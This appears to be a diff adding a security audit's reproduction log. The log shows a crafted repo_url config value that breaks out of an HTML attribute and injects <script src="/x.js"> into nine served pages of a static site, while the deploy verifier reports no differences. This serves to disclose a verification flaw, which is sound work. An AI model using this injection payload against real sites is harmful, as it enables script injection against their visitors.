@@ -1,0 +1,21 @@
+check-01 (v3-verifydeploy): independent reproduction of verify-deploy:placeholder-values-from-live-config-unvalidated
+command: bash bin/sbx.sh v3-verifydeploy 300 -- python3 -I /scratch/harness-01.py   (cwd /target read-only, no network, env -i, prlimit)
+harness: harness-01.py (same directory); fake deployment is an in-process dict replacing verify-deploy fetch(); builds use target tools/build.py --source aaaa... test-tag 1760000000
+input: /api/v1/config = {"network":"esmeralda","repo_url":"https://github.com/c7b/hidebox\"><script src=\"/x.js\"></script><a hidden href=\"","security_drop":null}
+exit status: 0
+=== output ===
+payload /api/v1/config: {"network": "esmeralda", "repo_url": "https://github.com/c7b/hidebox\"><script src=\"/x.js\"></script><a hidden href=\"", "security_drop": null}
+generated mutis.toml:
+public_origin = "https://hidebox.example"
+network = "esmeralda"
+security_drop_url = ""
+repo_url = "https://github.com/c7b/hidebox\"><script src=\"/x.js\"></script><a hidden href=\""
+
+build served: exit 0 
+build verifier: exit 0 
+compare(): 0 differences across 213 files []
+/x.js in manifest: False | /x.js fetched by verifier: False
+served pages carrying <script src="/x.js">: ['/404.html', '/app/app.html', '/app/view.html', '/fine-print/index.html', '/how/index.html', '/index.html', '/judges/index.html', '/made/index.html', '/v2/index.html']
+/app/view.html header snippet: <a class="gh" href="https://github.com/c7b/hidebox"><script src="/x.js"></script><a hidden href="" aria-label="Source code on GitHub"><svg class="icon" focusable="false" ari
+build honest: exit 0 
+control (honest config rebuild): 12 differences, e.g. ['.well-known/security.txt: served bytes differ from the build', '404.html: served bytes differ from the build', 'app/app.html: served bytes differ from the build']
